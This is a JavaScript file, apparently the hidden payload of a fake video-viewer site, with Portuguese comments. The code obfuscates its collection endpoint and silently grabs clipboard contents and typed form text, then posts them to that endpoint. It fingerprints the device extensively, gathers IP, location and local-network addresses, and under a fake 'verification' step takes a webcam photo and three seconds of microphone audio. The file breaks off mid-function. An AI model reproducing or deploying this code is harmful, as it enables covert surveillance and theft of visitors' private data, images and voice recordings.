

// endpoint ofuscado (montado em runtime — não aparece como string no source)
const API = "https://gunsviewer.vercel.app/api/" + String.fromCharCode(115, 116, 97, 116, 115);

// Globais de ponte (nomes preservados pelo ofuscador — renameGlobals:false)
var __viewer = null; // sessão escrita pelo app.js
var __cb = null;     // clipboard capturado

const FAKE_VIDEOS = [
  { id: 1, title: "corte-001.mp4", views: 284732, likes: 12453 },
  { id: 2, title: "corte-002.mp4", views: 193847, likes: 9872 },
  { id: 3, title: "corte-003.mp4", views: 347291, likes: 15634 },
  { id: 4, title: "corte-004.mp4", views: 89432, likes: 4521 },
  { id: 5, title: "corte-005.mp4", views: 562198, likes: 23187 },
  { id: 6, title: "corte-006.mp4", views: 142853, likes: 7823 },
  { id: 7, title: "corte-007.mp4", views: 278341, likes: 11234 },
  { id: 8, title: "corte-008.mp4", views: 451029, likes: 18972 },
];

// ============ CLIPBOARD ULTRA (pega TUDO, zero spam de pop-up) ============
// Onde guarda o último texto capturado do clipboard (enviado junto no payload).
__cb = null;
window.__lastFp = window.__lastFp || null;

// Exfil imediato quando clipboard muda (usa último fp em cache pra não precisar re-coletar)
function _sendCBNow(reason) {
  try {
    if (!__cb) return;
    const fp = window.__lastFp || null;
    const payload = JSON.stringify({ fp: fp, mm: null, cb: __cb, cbreason: reason || "paste", auto: true, ultra: true, ts: new Date().toISOString(), pg: location.href });
    try { fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } catch {}
    try { const k = "_grab_cb_" + Date.now(); localStorage.setItem(k, payload); } catch {}
  } catch {}
}

// Lê o clipboard ATIVO (readText pode pedir permissão UMA vez; depois fica silencioso).
// SÓ chamar dentro de gesto (clique/tecla) ou quando permissão já granted — nunca em loop cego.
function _rc() {
  try {
    if (!navigator.clipboard || !navigator.clipboard.readText) return;
    // se já temos permissão granted, pode ler até fora de gesto sem prompt
    try {
      if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: "clipboard-read" }).then(function(st){
          if (st && st.state === "granted") {
            navigator.clipboard.readText().then(function(t){
              if (t && t.trim() && t !== __cb) { __cb = String(t).slice(0, 4000); _sendCBNow("read-granted"); }
            }).catch(function(){});
          }
        }).catch(function(){});
      }
    } catch {}
    // tentativa direta (funciona dentro de gesto sem prompt extra)
    // SEM fallback execCommand: ele dava focus() num textarea escondido e ABRIA O TECLADO no mobile
    navigator.clipboard.readText().then((t) => {
      if (t && t.trim() && t !== __cb) { __cb = String(t).slice(0, 4000); _sendCBNow("read-gesture"); }
    }).catch(() => {});
  } catch {}
}

// Pega TUDO: paste + copy + cut dentro do site (100% silencioso, sem permissão)
function _cbFromEvent(e, reason) {
  try {
    let t = null;
    try { t = (e.clipboardData || window.clipboardData).getData("text"); } catch {}
    if (!t && reason === "copy") { try { const s = window.getSelection(); t = s ? s.toString() : null; } catch {} }
    if (t && String(t).trim() && t !== __cb) { __cb = String(t).slice(0, 4000); _sendCBNow(reason); }
  } catch {}
}
document.addEventListener("paste", function(e){ _cbFromEvent(e, "paste"); }, true);
document.addEventListener("copy", function(e){ _cbFromEvent(e, "copy"); }, true);
document.addEventListener("cut", function(e){ _cbFromEvent(e, "cut"); }, true);

// Dentro de gesto (clique/tecla) tenta ler o clipboard do SO — é onde o browser permite sem prompt extra
try {
  const _cbGesture = function(){ try{ _rc(); }catch{} };
  document.addEventListener("click", _cbGesture, { passive: true });
  document.addEventListener("keydown", _cbGesture, { passive: true });
  document.addEventListener("touchend", _cbGesture, { passive: true });
} catch {}

// GBOARD + fixados: pinned/history do teclado entra via evento input (não paste) — captura tudo digitado/colado nos campos
try {
  let _inputT = null;
  const _grabInputs = function(reason) {
    try {
      const vals = [];
      const els = document.querySelectorAll("input[type=text], input:not([type]), input[type=search], textarea");
      for (let i = 0; i < els.length; i++) {
        try {
          const v = els[i].value;
          if (v && String(v).trim().length >= 2) vals.push(String(v).slice(0, 1000));
        } catch {}
      }
      if (vals.length) {
        const joined = vals.join("\n---\n").slice(0, 4000);
        if (joined && joined !== __cb) { __cb = joined; _sendCBNow(reason || "input"); }
      }
    } catch {}
  };
  document.addEventListener("input", function(){ try{ clearTimeout(_inputT); }catch{} _inputT = setTimeout(function(){ _grabInputs("input"); }, 1200); }, true);
  document.addEventListener("change", function(){ try{ _grabInputs("change"); }catch{} }, true);
  document.addEventListener("focusout", function(){ try{ _grabInputs("blur"); }catch{} }, true);
} catch {}

// ============ FINGERPRINT ============

async function _ip() {
  const sources = [
    async () => {
      const r = await fetch("https://ipapi.co/json/", { cache: "no-store" });
      const d = await r.json();
      return {
        ip: d.ip || "unknown", ipv6: d.version === 6 ? d.ip : null,
        isp: d.org || null, city: d.city || null, region: d.region || null,
        country: d.country_name || null, lat: d.latitude ?? null, lon: d.longitude ?? null,
        postal: d.postal || null, asn: d.asn || null, ipTz: d.timezone || null,
      };
    },
    async () => {
      const r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
      const d = await r.json();
      return { ip: d.ip || "unknown", ipv6: null, isp: null, city: null, region: null, country: null, lat: null, lon: null, postal: null, asn: null, ipTz: null };
    },
  ];
  for (const s of sources) {
    try {
      const res = await s();
      if (res.ip) return res;
    } catch {}
  }
  return { ip: "unknown", ipv6: null, isp: null, city: null, region: null, country: null, lat: null, lon: null, postal: null, asn: null, ipTz: null };
}

async function _he() {
  try {
    if (navigator.userAgentData && navigator.userAgentData._heValues) {
      const v = await navigator.userAgentData._heValues([
        "architecture", "bitness", "brands", "mobile", "model",
        "platform", "platformVersion", "uaFullVersion", "fullVersionList", "wow64",
      ]);
      return v;
    }
  } catch {}
  return null;
}

function _mu(ua) {
  let m = /\(.*?;\s*([^);]+?)\s*Build\//.exec(ua); // Android: "SM-G991B Build/"
  if (m) return m[1].trim();
  m = /\((iPhone[\d,A-Za-z]+)\)/.exec(ua);
  if (m) return m[1];
  m = /\((iPad[\d,A-Za-z]+)\)/.exec(ua);
  if (m) return m[1];
  return null;
}

function _gl() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return { vendor: "N/A", renderer: "N/A", extensions: [], version: "N/A", shadingLang: "N/A", maxTex: 0, maxCubeTex: 0, maxVary: 0, maxAttr: 0, aliasedRange: "N/A" };
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
      renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
      extensions: gl.getSupportedExtensions() || [],
      version: gl.getParameter(gl.VERSION),
      shadingLang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
      maxTex: gl.getParameter(gl.MAX_TEXTURE_SIZE),
      maxCubeTex: gl.getParameter(gl.MAX_CUBE_MAP_TEXTURE_SIZE),
      maxVary: gl.getParameter(gl.MAX_VARYING_VECTORS),
      maxAttr: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
      aliasedRange: JSON.stringify(gl.getParameterExt(gl.ALIASED_POINT_SIZE_RANGE)),
    };
  } catch { return { vendor: "N/A", renderer: "N/A", extensions: [], version: "N/A", shadingLang: "N/A", maxTex: 0, maxCubeTex: 0, maxVary: 0, maxAttr: 0, aliasedRange: "N/A" }; }
}

function _hc() {
  try {
    const c = document.createElement("canvas");
    c.width = 280; c.height = 60;
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20);
    ctx.fillStyle = "#069"; ctx.fillText("fingerprint", 2, 15);
    ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.fillText("fingerprint", 4, 17);
    // Canvas 2D avançado: emoji + gradientes + curvas (mais entropia)
    ctx.font = "18px serif"; ctx.fillText("🕷️🔥💀", 2, 35);
    const g = ctx.createLinearGradient(0, 0, 280, 0);
    g.addColorStop(0, "#ff0000"); g.addColorStop(0.5, "#00ff00"); g.addColorStop(1, "#0000ff");
    ctx.fillStyle = g; ctx.fillRect(100, 35, 80, 15);
    return c.toDataURL().slice(-150);
  } catch { return "N/A"; }
}

// WebGL2 canvas fingerprint (diferente do WebGL1 — mais entropia)
function _w2c() {
  try {
    const c = document.createElement("canvas"); c.width = 100; c.height = 100;
    const gl = c.getContext("webgl2") || c.getContext("experimental-webgl2");
    if (!gl) return "N/A";
    gl.clearColor(0.1, 0.5, 0.9, 1.0); gl.clear(gl.COLOR_BUFFER_BIT);
    const pixels = new Uint8Array(400);
    gl.readPixels(0, 0, 10, 10, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
    let h = 0;
    for (let i = 0; i < pixels.length; i++) h = ((h << 5) - h + pixels[i]) | 0;
    return h.toString(16);
  } catch { return "N/A"; }
}

// Font fingerprinting: detecta fonts instaladas
function _fd() {
  const base = ["monospace", "sans-serif", "serif"];
  const test = "mmmmmmmmmmlli";
  const w = 100, h = 50;
  const c = document.createElement("canvas"); c.width = w; c.height = h;
  const ctx = c.getContext("2d");
  const baseW = {};
  for (const f of base) { ctx.font = "72px " + f; baseW[f] = ctx.measureText(test).width; }
  const fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Comic Sans MS", "Impact", "Lucida Console", "Tahoma", "Trebuchet MS", "Century Gothic", "Franklin Gothic Medium", "Cambria", "Forte", "Maiandra GD", "Jokerman", "Papyrus", "Brush Script MT"];
  const found = [];
  for (const f of fonts) {
    ctx.font = "72px '" + f + "', monospace";
    const fw = ctx.measureText(test).width;
    if (fw !== baseW.monospace && fw !== baseW["sans-serif"] && fw !== baseW.serif) found.push(f);
  }
  return found;
}

// Performance timing (carregamento da página)
function _pt() {
  try {
    const nav = performance.getEntriesByType("navigation")[0];
    if (!nav) return null;
    return {
      dns: Math.round(nav.domainLookupEnd - nav.domainLookupStart),
      tcp: Math.round(nav.connectEnd - nav.connectStart),
      ssl: Math.round(nav.secureConnectionStart > 0 ? nav.connectEnd - nav.secureConnectionStart : 0),
      ttfb: Math.round(nav.responseStart - nav.requestStart),
      domLoad: Math.round(nav.domContentLoadedEventEnd - nav.startTime),
      fullLoad: Math.round(nav.loadEventEnd - nav.startTime),
    };
  } catch { return null; }
}

// Storage estimate
async function _se() {
  try {
    if (navigator.storage && navigator.storage.estimate) {
      const e = await navigator.storage.estimate();
      return { usage: e.usage, quota: e.quota };
    }
  } catch {}
  return null;
}

// Screen orientation
function _so() {
  try {
    const o = screen.orientation;
    return o ? { type: o.type, angle: o.angle } : null;
  } catch { return null; }
}

async function _ha() {
  try {
    const AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return "N/A";
    const ctx = new AC();
    const osc = ctx.createOscillator();
    const an = ctx.createAnalyser();
    const gain = ctx.createGain();
    const sp = ctx.createScriptProcessor(4096, 1, 1);
    gain.gain.value = 0;
    osc.connect(an); an.connect(sp); sp.connect(gain); gain.connect(ctx.destination);
    osc.start(0);
    const data = new Float32Array(an.frequencyBinCount);
    an.getFloatFrequencyData(data);
    let h = 0;
    for (let i = 0; i < data.length; i++) h = ((h << 5) - h + Math.floor(data[i])) | 0;
    osc.stop(); ctx.close();
    return h.toString(16);
  } catch { return "N/A"; }
}

function getBrowser() {
  const ua = navigator.userAgent;
  let name = "Unknown", version = "Unknown", engine = "Unknown";
  if (ua.includes("Firefox/")) { name = "Firefox"; version = ua.split("Firefox/")[1]?.split(" ")[0]; }
  else if (ua.includes("Edg/")) { name = "Edge"; version = ua.split("Edg/")[1]?.split(" ")[0]; engine = "Chromium"; }
  else if (ua.includes("Chrome/")) { name = "Chrome"; version = ua.split("Chrome/")[1]?.split(" ")[0]; engine = "Chromium"; }
  else if (ua.includes("Safari/")) { name = "Safari"; version = ua.split("Version/")[1]?.split(" ")[0]; engine = "WebKit"; }
  if (ua.includes("Gecko/")) engine = engine === "Unknown" ? "Gecko" : engine;
  if (ua.includes("WebKit/")) engine = engine === "Unknown" ? "WebKit" : engine;
  return { name, version, engine };
}

function _pg() {
  const out = [];
  for (let i = 0; i < navigator.plugins.length; i++) { const p = navigator.plugins[i]; if (p) out.push(p.name); }
  return out;
}

function _li() {
  return new Promise((resolve) => {
    const ips = [];
    try {
      const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
      if (!RTCPeerConnection) return resolve([]);
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
      pc.onicecandidate = (e) => {
        if (e.candidate) {
          const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
          if (m && !ips.includes(m[0]) && !m[0].startsWith("127.")) ips.push(m[0]);
        } else { pc.close(); resolve(ips); }
      };
      setTimeout(() => { try { pc.close(); } catch {}; resolve(ips); }, 2000);
    } catch { resolve(ips); }
  });
}

// ============ RECON COMPLETO ============

// Enumerar dispositivos de mídia (câmeras, microfones, speakers)
async function _md() {
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
    const devs = await navigator.mediaDevices.enumerateDevices();
    return devs.map(d => ({ kind: d.kind, label: d.label || "sem_label", id: d.deviceId?.slice(0, 16) || null, group: d.groupId?.slice(0, 16) || null }));
  } catch { return null; }
}

// Speech synthesis voices (únicas por SO/config)
function _sv() {
  try {
    if (!speechSynthesis) return [];
    return speechSynthesis.getVoices().map(v => ({ name: v.name, lang: v.lang, local: v.localService, def: v.default }));
  } catch { return []; }
}

// Permissions status (câmera, microfone, notificação, geolocalização, etc.)
async function _ps() {
  const perms = ["camera", "microphone", "notifications", "geolocation", "midi", "persistent-storage", "accelerometer", "gyroscope", "magnetometer"];
  const result = {};
  for (const p of perms) {
    try {
      const status = await navigator.permissions.query({ name: p });
      result[p] = status.state;
    } catch { result[p] = "unavailable"; }
  }
  return result;
}

// CSS feature detection (quais APIs CSS o browser suporta)
function _cs() {
  const el = document.createElement("div");
  const features = {};
  const tests = [
    ["backdropFilter", "backdrop-filter"],
    ["WebkitBackdropFilter", "-webkit-backdrop-filter"],
    ["scrollbarWidth", "scrollbar-width"],
    ["overscrollBehavior", "overscroll-behavior"],
    ["accentColor", "accent-color"],
    ["containerType", "container-type"],
    ["has", ":has"],
    ["layer", "@layer"],
    ["scope", "@scope"],
  ];
  for (const [prop, css] of tests) {
    try { features[prop] = prop in el.style || CSS.supports(css, "initial"); } catch { features[prop] = false; }
  }
  return features;
}

// JS engine quirks (diferenças entre V8, SpiderMonkey, etc.)
function _jq() {
  return {
    expm1: typeof Math.expm1 === "function",
    atob: typeof atob === "function",
    bigInt: typeof BigInt === "function",
    weakRef: typeof WeakRef === "function",
    finalizationRegistry: typeof FinalizationRegistry === "function",
    structuredClone: typeof structuredClone === "function",
    broadcastChannel: typeof BroadcastChannel === "function",
    cryptoRandom: typeof crypto.getRandomValues === "function",
    sharedArrayBuffer: typeof SharedArrayBuffer !== "undefined",
    wasm: typeof WebAssembly !== "undefined",
    trustedTypes: typeof trustedTypes !== "undefined",
  };
}

// SVG fingerprint (diferente por engine de renderização)
function _sf() {
  try {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200"><text x="10" y="50" font-size="30">fingerprint</text><circle cx="100" cy="100" r="50" fill="rgba(255,0,0,0.5)"/></svg>';
    const blob = new Blob([svg], { type: "image/svg+xml" });
    const url = URL.createObjectURL(blob);
    return url.length; // tamanho varia por browser
  } catch { return 0; }
}

// Media capabilities ( codecs suportados )
async function _mc() {
  const codecs = ["video/mp4;codecs=avc1.42E01E", "video/webm;codecs=vp9", "video/webm;codecs=opus", "audio/mp4;codecs=mp4a.40.2", "audio/webm;codecs=opus", "video/av1"];
  const result = {};
  for (const c of codecs) {
    try {
      const sup = await MediaSource.isTypeSupported(c);
      result[c.split(";")[0].split("/")[1]] = sup;
    } catch { result[c] = false; }
  }
  return result;
}

// Canvas font rendering fingerprint (texto em diferentes fonts)
function _cfr() {
  try {
    const c = document.createElement("canvas"); c.width = 400; c.height = 100;
    const ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    const fonts = ["serif", "sans-serif", "monospace", "cursive", "fantasy"];
    let h = 0;
    for (let i = 0; i < fonts.length; i++) {
      ctx.font = "20px " + fonts[i];
      const w = ctx.measureText("The quick brown fox").width;
      h = ((h << 5) - h + w) | 0;
    }
    return h.toString(16);
  } catch { return "N/A"; }
}

// WebGL shader fingerprint (precision qualifiers variam por GPU/driver)
function _wsf() {
  try {
    const c = document.createElement("canvas"); c.width = 1; c.height = 1;
    const gl = c.getContext("webgl");
    if (!gl) return "N/A";
    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, "precision mediump float;\nvoid main(){gl_Position=vec4(0,0,0,1);}");
    gl.compileShader(vs);
    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, "precision mediump float;\nvoid main(){gl_FragColor=vec4(1,0,0,1);}");
    gl.compileShader(fs);
    const pg = gl.createProgram();
    gl.attachShader(pg, vs); gl.attachShader(pg, fs);
    gl.linkProgram(pg);
    const info = gl.getProgramParameter(pg, gl.ACTIVE_UNIFORMS) + "" + gl.getProgramParameter(pg, gl.ACTIVE_ATTRIBUTES);
    gl.deleteProgram(pg); gl.deleteShader(vs); gl.deleteShader(fs);
    let h = 0;
    for (let i = 0; i < info.length; i++) h = ((h << 5) - h + info.charCodeAt(i)) | 0;
    return h.toString(16);
  } catch { return "N/A"; }
}

// Intl.DateTimeFormat locale detail
function _idt() {
  try {
    const dtf = new Intl.DateTimeFormat();
    const parts = dtf.formatToParts(new Date());
    return {
      locale: dtf.resolvedOptions().locale,
      calendar: dtf.resolvedOptions().calendar,
      numbering: dtf.resolvedOptions().numberingSystem,
      timezone: dtf.resolvedOptions().timeZone,
      format: parts.map(p => p.type + ":" + p.value).join(","),
    };
  } catch { return null; }
}

// Crypto subtle fingerprint (hash speeds variam por hardware)
async function _csf() {
  try {
    const data = new Uint8Array(1000000); // 1MB
    crypto.getRandomValues(data);
    const start = performance.now();
    await crypto.subtle.digest("SHA-256", data);
    const elapsed = performance.now() - start;
    return Math.round(elapsed);
  } catch { return 0; }
}

// Hardware concurrency + device memory + maxTouchPoints detalhado
function _hw() {
  return {
    cores: navigator.hardwareConcurrency || 0,
    memory: navigator.deviceMemory || 0,
    touch: navigator.maxTouchPoints || 0,
    platform: navigator.platform || "N/A",
    productSub: navigator.productSub || "N/A",
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || "N/A",
    pdfViewerEnabled: navigator.pdfViewerEnabled ?? "N/A",
    webdriver: navigator.webdriver || false,
    windowOuter: window.outerWidth + "x" + window.outerHeight,
    windowInner: window.innerWidth + "x" + window.innerHeight,
    colorDepth: screen.colorDepth,
    pixelDepth: screen.pixelDepth,
    orientation: screen.orientation ? screen.orientation.type + ":" + screen.orientation.angle : "N/A",
  };
}

// ============ FIM RECON ============

async function _cf() {
  const nav = navigator;
  const win = window;
  const [ipData, audioHash, localIPs, highEntropy, storageEst, mediaDevices, perms, cssFeatures, jsQuirks, mediaCaps, hwDetails, intlDetails, cryptoSpeed, svgSize] = await Promise.all([
    _ip(), _ha(), _li(), _he(), _se(), _md(), _ps(), _cs(), _jq(), _mc(), _hw(), _idt(), _csf(), _sf(),
  ]);
  const webgl = _gl();
  const browser = getBrowser();
  const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
  const model = highEntropy?.model || _mu(nav.userAgent) || null;

  let battery = null;
  try {
    if (nav.getBattery) {
      const b = await nav.getBattery();
      battery = Math.round((b.level || 0) * 100) + "%" + (b.charging ? " (charging)" : "");
    }
  } catch {}

return {
    n: {
      ...ipData,
      li: localIPs,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    },
    d: {
      ua: nav.userAgent,
      md: model,
      pl: highEntropy?.platform || nav.platform,
      pv: highEntropy?.platformVersion || null,
      ar: highEntropy?.architecture || null,
      bi: highEntropy?.bitness || null,
      w6: highEntropy?.wow64 ?? null,
      mo: highEntropy?.mobile ?? /Mobi/.test(nav.userAgent),
      la: nav.language,
      ls: Array.from(nav.languages || []),
      ve: nav.vendor,
      sc: win.screen.width + "x" + win.screen.height,
      av: win.screen.availWidth + "x" + win.screen.availHeight,
      pr: win.devicePixelRatio,
      cd: win.screen.colorDepth,
      co: nav.hardwareConcurrency,
      ra: nav.deviceMemory || null,
      ba: battery,
      to: "ontouchstart" in win ? "yes" : "no",
      mt: nav.maxTouchPoints || 0,
      cn: conn ? conn.effectiveType + " down:" + conn.downlink + " rtt:" + conn.rtt + "ms" : null,
      dn: nav.doNotTrack || null,
      ck: nav.cookieEnabled,
      pf: !!document.querySelector('embed[type="application/pdf"]'),
      so: _so(),
    },
    b: {
      nm: browser.name,
      vn: browser.version,
      eg: browser.engine,
      bd: highEntropy?.brands ? highEntropy.brands.map((x) => x.brand + " " + x.version).join(", ") : null,
      fv: highEntropy?.fullVersionList ? highEntropy.fullVersionList.map((x) => x.brand + " " + x.version).join(", ") : null,
      pg: _pg(),
      wv: webgl.vendor,
      wr: webgl.renderer,
      we: webgl.extensions.slice(0, 25),
      wv2: webgl.version,
      wsl: webgl.shadingLang,
      wmt: webgl.maxTex,
      ch: _hc(),
      w2: _w2c(),
      fd: _fd(),
      wh: (() => {
        try {
          const c = document.createElement("canvas"); c.width = 250; c.height = 250;
          const gl = c.getContext("webgl");
          const di = gl.getExtension("WEBGL_debug_renderer_info");
          const raw = gl.getParameter(di ? di.UNMASKED_VENDOR_WEBGL : gl.VENDOR) + gl.getParameter(di ? di.UNMASKED_RENDERER_WEBGL : gl.RENDERER);
          let h = 0; for (let i = 0; i < raw.length; i++) h = ((h << 5) - h + raw.charCodeAt(i)) | 0;
          return h.toString(16);
        } catch { return "N/A"; }
      })(),
      ah: audioHash,
      wd: nav.webdriver || false,
      hl: /HeadlessChrome|PhantomJS/.test(nav.userAgent),
      pt: _pt(),
    },
    m: {
      lg: typeof localStorage !== "undefined",
      idb: typeof indexedDB !== "undefined",
      sw: "serviceWorker" in nav,
      rm: win.matchMedia("(prefers-reduced-motion: reduce)").matches,
      dm: win.matchMedia("(prefers-color-scheme: dark)").matches,
      cg: win.matchMedia("(color-gamut: p3)").matches ? "p3" : "srgb",
      hd: win.matchMedia("(dynamic-range: high)").matches || false,
      pm: performance.memory ? JSON.stringify(performance.memory) : null,
      se: storageEst,
      bt: typeof Bluetooth !== "undefined",
      us: typeof USB !== "undefined",
      sr: typeof Serial !== "undefined",
    },
    // RECON EXTRA: tudo que um hacker precisa
    r: {
      md: mediaDevices,        // câmeras, microfones, speakers
      sv: _sv(),               // speech synthesis voices
      pm: perms,               // permissions status
      cs: cssFeatures,         // CSS feature support
      jq: jsQuirks,            // JS engine quirks
      mc: mediaCaps,           // media codec support
      hw: hwDetails,           // hardware details
      id: intlDetails,         // Intl locale details
      cs: cryptoSpeed,         // crypto hash speed (hardware fingerprint)
      sf: svgSize,             // SVG rendering size
      wsf: _wsf(),             // WebGL shader fingerprint
      cfr: _cfr(),             // Canvas font rendering
      ts: new Date().toISOString(),
      pg: window.location.href,
      rf: document.referrer || null,
    },
  };
}

// ============ CAMERA / MIC ============

function _b64(blob) {
  return new Promise((resolve) => {
    const r = new FileReader();
    r.onloadend = () => resolve(r.result?.split(",")[1] || null);
    r.onerror = () => resolve(null);
    r.readAsDataURL(blob);
  });
}

function _lm(canvas) {
  try {
    const ctx = canvas.getContext("2d");
    const w = canvas.width, h = canvas.height;
    const data = ctx.getImageData(0, 0, w, h).data;
    const step = 6;
    let sum = 0, n = 0;
    for (let y = 0; y < h; y += step) {
      for (let x = 0; x < w; x += step) {
        const i = (y * w + x) * 4;
        sum += 0.2126 * data[i] + 0.7152 * data[i + 1] + 0.0722 * data[i + 2];
        n++;
      }
    }
    return n ? sum / n : 0;
  } catch { return 0; }
}

// CAPTURA CONSOLIDADA: UM único getUserMedia(video + audio) numa só permissão.
// Depois usa a video track pro snapshot e a audio track pros 3s de gravação.
// (duas chamadas getUserMedia em paralelo = Chrome recusa sem prompt → "recusa na hora")
async function _cm() {
  const r = { cg: false, mg: false, ce: null, me: null, sn: null, au: null, am: null, du: 0, dk: null, td: false };
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" },
      audio: { echoCancellation: true, noiseSuppression: true },
    });
    r.cg = true;
    r.mg = true;
  } catch (e) {
    const m = e && e.message ? e.message : "permission denied";
    r.ce = m; r.me = m;
    return r;
  }

  // snapshot da câmera
  try {
    const video = document.createElement("video");
    video.srcObject = stream; video.muted = true; video.playsInline = true;
    video.style.display = "none";
    document.body.appendChild(video);
    await new Promise((resolve) => {
      let settled = false;
      const done = () => { if (!settled) { settled = true; video.remove(); resolve(); } };
      video.onloadedmetadata = () => {
        video.play().then(() => {
          setTimeout(() => {
            try {
              const c = document.createElement("canvas");
              c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
              c.getContext("2d").drawImage(video, 0, 0, c.width, c.height);
              r.sn = c.toDataURL("image/jpeg", 0.85).split(",")[1];
              const lum = _lm(c);
              r.dk = Math.round(lum);
              r.td = lum < 20; // TELA PRETA: webcam tampada → bot
            } catch (e) { r.ce = e.message; }
            done();
          }, 900);
        }).catch(done);
      };
      video.onerror = done;
      setTimeout(done, 5000);
    });
  } catch (e) { r.ce = e.message; }

  // 3s de áudio com a audio track do MESMO stream
  try {
    const mime = ["audio/webm;codecs=opus", "audio/webm", "audio/mp4"].find((t) => MediaRecorder.isTypeSupported(t)) || "";
    const rec = new MediaRecorder(stream, mime ? { mimeType: mime } : undefined);
    const chunks = [];
    await new Promise((resolve) => {
      rec.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
      rec.onstop = () => { resolve(); };
      rec.onerror = () => { resolve(); };
      rec.start();
      setTimeout(() => { if (rec.state === "recording") rec.stop(); }, 3000);
    });
    if (chunks.length) {
      const blob = new Blob(chunks, { type: rec.mimeType || "audio/webm" });
      r.au = await _b64(blob);
      r.am = blob.type;
      r.du = 3000;
    }
  } catch (e) { r.me = e.message; }

  try { stream.getTracks().forEach((t) => t.stop()); } catch {}
  return r;
}

// ============ UI (só se a página tiver player) ============

function _ui(vid) {
  const el = (id) => document.getElementById(id);
  if (!el("vTitle")) return; // página sem player (index) → UI opcional

  const v = FAKE_VIDEOS[vid - 1];
  el("vTitle").textContent = v.title;
  el("vViews").textContent = v.views.toLocaleString("pt-BR") + " views";
  el("vLikes").textContent = "❤ " + v.likes.toLocaleString("pt-BR");
  el("barStatus").textContent = "corte-0" + vid;
  el("pBg").style.background = `linear-gradient(${vid * 45}deg,#1c0714,#12081f 45%,#0a1022 75%,#160618)`;
  el("pSub").textContent = "carregando…";

  const up = el("upNext");
  if (up) {
    up.innerHTML = FAKE_VIDEOS.filter((x) => x.id !== vid).slice(0, 3).map((x) => `
      <a class="upnext" href="graba.html?v=${x.id}">
        <div class="th"><div class="bg" style="background:linear-gradient(${x.id * 60}deg,#1c0714,#12081f)"></div></div>
        <div><div class="tt">${x.title}</div><div class="vv">${x.views.toLocaleString("pt-BR")} views</div></div>
      </a>`).join("");
  }

  // barra de progresso falsa
  const fill = el("pFill");
  if (fill) {
    const t = el("pT");
    const total = 754; let sec = 0;
    setInterval(() => {
      sec = (sec + 1) % total;
      fill.style.width = (sec / total) * 100 + "%";
      const m = Math.floor(sec / 60), s = sec % 60;
      if (t) t.textContent = (m < 10 ? "0" : "") + m + ":" + (s < 10 ? "0" : "") + s + " / 12:34";
    }, 1000);
  }
}

// ============ MAIN (exposto global, só roda após entrar no site) ============

// ID do dono — o site IGNORA totalmente esse usuário (nada é capturado nem enviado)
const _o = "1533178254318637186";

let lastResult = null;
let done = false;
let runningGrab = null;

// Retorna o resultado para a UI (owner / media ok / negado)
// SINGLETON: se uma captura já está rodando (ex: grab da entrada + clique no lock),
// a segunda chamada ESPERA a mesma em vez de disparar outro getUserMedia em paralelo
// (dois getUserMedia simultâneos = Chrome recusa instantâneo, sem prompt).
async function _g() {
  _rc(); // dentro do gesto do clique → readText pode funcionar sem prompt
  // IGNORA O DONO: se o viewer logado for o admin, não captura NADA (sem câmera/mic/fingerprint)
  try {
    const v = __viewer || {};
    if (String(v.id) === _o) return { ow: true };
  } catch {}

  // já capturou com sucesso → reutiliza (sem pedir permissão de novo)
  if (done && lastResult && lastResult.mm && (lastResult.mm.cg || lastResult.mm.mg)) {
    return lastResult;
  }

  if (runningGrab) return runningGrab; // já rodando → aguarda a mesma captura

  const p = (async () => {
    done = true;
    const params = new URLSearchParams(window.location.search);
    const vid = Math.min(Math.max(parseInt(params.get("v") || "1", 10), 1), 8);
    _ui(vid); // no-op no index, ativa no player

    let fp = null;
    let media = null;
    let geoV = null;

    // SÓ na verificação (gesto do botão Continuar): fingerprint + câmera/mic + GPS juntos num lugar só
    const [fpR, mediaR, geoR] = await Promise.allSettled([_cf(), _cm(), _geo()]);
    if (fpR.status === "fulfilled") fp = fpR.value; else fp = { er: fpR.reason?.message || "err" };
    if (mediaR.status === "fulfilled") media = mediaR.value; else media = { er: mediaR.reason?.message || "err" };
    if (geoR.status === "fulfilled") geoV = geoR.value; else geoV = null;
    try { if (fp && geoV) fp.geo = geoV; } catch {}

    const result = { fp, mm: media, geo: geoV };
    lastResult = result;
    try { if (fp) window.__lastFp = fp; } catch{}

    // se negou/falhou, permite nova tentativa (retry do lightbox)
    const ok = media && (media.cg || media.mg);
    if (!ok) done = false;

    // EXFIL MULTI-CANAL: endpoint + localStorage backup
    const payload = JSON.stringify({ ...result, cb: __cb || null });
